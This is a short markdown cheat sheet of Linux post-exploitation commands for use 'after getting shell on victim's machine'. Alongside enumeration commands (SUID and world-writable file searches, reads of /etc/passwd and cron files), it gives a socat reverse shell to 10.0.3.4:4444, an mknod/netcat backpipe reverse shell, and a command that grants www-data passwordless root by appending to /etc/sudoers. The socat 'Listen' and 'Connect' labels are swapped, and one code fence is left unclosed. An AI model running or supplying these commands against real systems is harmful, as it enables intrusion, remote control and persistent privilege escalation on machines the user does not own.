Linux Enumeration
===================

#### Things to do after getting shell on victim’s machine

- Find World Writable Folders
```ShellSession
find / -xdev -type d -perm -0002 -ls 2> /dev/null

- Find World Writable Files

```ShellSession
find / -xdev -type f -perm -0002 -ls 2> /dev/null
```

- Find SUIDs

```ShellSession
find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null
```

- DIstro Information

```ShellSession
cat /etc/*-release
```

- Check open ports

```ShellSession
netstat -antup
```

- Check for sudo permissions

```ShellSession
sudo -l
```

- Check OS architecture

```ShellSession
uname -a
```

- Check cronjobs

```ShellSession
cat /etc/cron*
```

- Check network configuration

```ShellSession
ip addr
```

- Check contents of **/etc/passwd**

```ShellSession
cat /etc/passwd
```

- Using **socat**
    - Listen

```ShellSession
      $ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

    - Connect

```ShellSession
      $ socat file:`tty`,raw,echo=0 tcp-listen:4444
```

- Reverse connection using mknod

```ShellSession
mknod /tmp/backpipe p; /bin/sh 0< /tmp/backpipe | nc <ip> <port> 1> /tmp/backpipe; rm /tmp/backpipe
```

- Check version of an installed application

```ShellSession
dpkg -l <application name>
```

- Sometimes checking `/opt` `/tmp` `/var` `/usr` might help.

- Edit **sudoers** file and grant sudo access to the current user (www-data in this case) with no password

```ShellSession
echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers
```
